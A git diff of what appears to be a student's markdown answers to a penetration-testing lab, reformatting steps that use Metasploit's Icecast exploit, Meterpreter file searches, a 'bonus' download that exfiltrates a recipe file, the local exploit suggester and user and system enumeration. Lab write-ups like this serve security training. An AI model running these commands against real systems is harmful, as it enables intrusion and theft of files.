@@ -74,7 +74,7 @@ You've been provided full access to the network and are getting ping responses f
    - Run the command that starts Metasploit:
     
       > Answer: `msfconsole`
-![](Images\msfconsole.png) 
+      >![](Images\msfconsole.png) 
  
 4. Search for the Icecast module and load it for use.
  
@@ -101,34 +101,28 @@ You've been provided full access to the network and are getting ping responses f
    - Run the command that runs the Icecast exploit.
       
      > Answer: exploit
-     > Answer: run 
-  
-  ![](Images/searchicecast.png)
+     > Answer: run
+     > ![](Images/searchicecast.png)
   
    - Run the command that performs a search for the `secretfile.txt` on the target.
       
      > Answer: `dir *secretfile.txt* /s /p`
-
-        Found C:\Users\IEUser\Documents\user.secretfile.txt
-        
-     ![](Images/secretfile.png)
+     > Found C:\Users\IEUser\Documents\user.secretfile.txt
+     > ![](Images/secretfile.png)
   
  7. You should now have a Meterpreter session open.
  
     - Run the command to performs a search for the `recipe.txt` on the target:
 
       > Answer: `dir *recipe.txt* /s /p`
-      
-        Found C:\Users\IEUser\Documents\Drinks.recipe.txt
-     
-     ![](Images/find_recipe.png)
+      > Found C:\Users\IEUser\Documents\Drinks.recipe.txt
+      > ![](Images/find_recipe.png)
  
     - **Bonus**: Run the command that exfiltrates the `recipe*.txt` file:
 
 
       > Answer: `download Users/IEUser/Documents/Drinks.recipe.txt`
- 
-    ![](Images/download_recipes.png)
+      > ![](Images/download_recipes.png)
 
 8. You can also use Meterpreter's local exploit suggester to find possible exploits.
 
@@ -136,10 +130,10 @@ You've been provided full access to the network and are getting ping responses f
    - **Note:** The exploit suggester is just that: a suggestion. 
    - Keep in mind that the listed suggestions may not include all available exploits.
 
-    Command: `run post/multi/recon/local_exploit_suggestor` 
-    Found 2 other possible exploits: 
-    `exploit/windows/local/ikeext_service`
-    `exploit/windows/local/ms16_075_reflection`
+    > Command: `run post/multi/recon/local_exploit_suggestor` 
+    > Found 2 other possible exploits: 
+    > `exploit/windows/local/ikeext_service`
+    > `exploit/windows/local/ms16_075_reflection`
 
  
 #### Bonus
@@ -148,22 +142,20 @@ You've been provided full access to the network and are getting ping responses f
 A. Run a Meterpreter post script that enumerates all logged on users.
 
   > Answer: `run post/windows/gather/enum_logged_on_users`
-  
-  ![](Image/enum_users.png)
+  > ![](Image/enum_users.png)
  
      
 B. Open a Meterpreter shell and gather system information for the target.
  
   > Answer: 
-  `shell`
-  `systeminfo`
-  
-  ![](Images/systeminfo.png)
+  > `shell`
+  > `systeminfo`
+  > ![](Images/systeminfo.png)
  
 C. Run the command that displays the target's computer system information:
 
    > Answer: `sysinfo`
- ![](Images/sysinfo.png)
+   > ![](Images/sysinfo.png)
 
 ---
 
